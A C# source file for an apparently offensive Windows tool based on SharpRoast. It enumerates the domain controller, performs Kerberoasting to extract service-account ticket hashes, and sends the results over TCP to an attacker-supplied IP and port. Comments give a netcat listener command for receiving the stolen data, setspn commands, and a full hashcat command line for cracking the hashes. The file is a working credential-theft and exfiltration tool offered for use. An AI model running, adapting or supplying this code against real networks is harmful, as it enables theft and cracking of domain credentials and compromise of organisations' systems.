using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Text;

namespace DCEnumNC
{
    class Program
    {
        /* BASED ON https://github.com/GhostPack/SharpRoast
         * Resources: https://docs.microsoft.com/en-us/windows-server/networking/sdn/security/kerberos-with-spn
         * How it works, mitigation and detection: https://attack.mitre.org/techniques/T1558/003/
            * 
            * On the DC to view a list of SPN: 
                setspn –L DC01
                setspn -L domain\user

            * We can register a SPN for a user as follow (Powershell):
                setspn -S HTTP/web.zinz.local zinz\loca

            * Crack the hash
               hashcat.exe -a 0 -m 13100 -w 3 --status --status-timer=60 --potfile-disable -p : -O --hwmon-temp-abort=85 -r rules\best64.rule kerbR.hash.txt "D:\wordlists\rockyou.txt"
                
        */
        static void Main(string[] args)
        {
            IPAddress IP;
            int port;
            if (args.Length != 3)
            {
                Console.WriteLine("You must pass an IP, a port and  a command[all or a <username>]");
                return;
            }
            else
            {
                if(!IPAddress.TryParse(args[0],out IP)){
                    Console.WriteLine("Invalid IP address: " + args[0]);
                    return;
                }

                if (!int.TryParse(args[1], out port))
                {
                    Console.WriteLine("Invalid port: " + args[1]);
                    return;
                }
            }
            //check domain 
            string dc = EnumDC.GetDCInfo();
            if (dc.StartsWith("An error")){
                Console.WriteLine(dc);
                return;
            }

            StringBuilder sb = new StringBuilder();
            sb.Append(dc);
            sb.Append(Environment.NewLine);

            //see the method RoastNow comment for other options
            string[] KBargs = { args[2] };
            sb.Append(KBRoast.RoastNow(KBargs));
            sb.Append(Environment.NewLine);

            Console.WriteLine(SendReport(IP.ToString(), port, sb.ToString()));

           
        }


        private static string SendReport(string ip, int port, string msg)
        {
            try
            {
                //on the receiver: nc -lvp 1234 > out.txt
                TcpClient client = new TcpClient();
                client.Connect(ip, port);
                NetworkStream nwStream = client.GetStream();
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(msg);

                nwStream.Write(bytesToSend, 0, bytesToSend.Length);
                nwStream.Flush();
                nwStream.Close();
                return "Report sent to " + ip + ":" + port;
            }
            catch (Exception ex) {
                return ex.Message + Environment.NewLine + ex.StackTrace;
                
            }
        }
    }
}
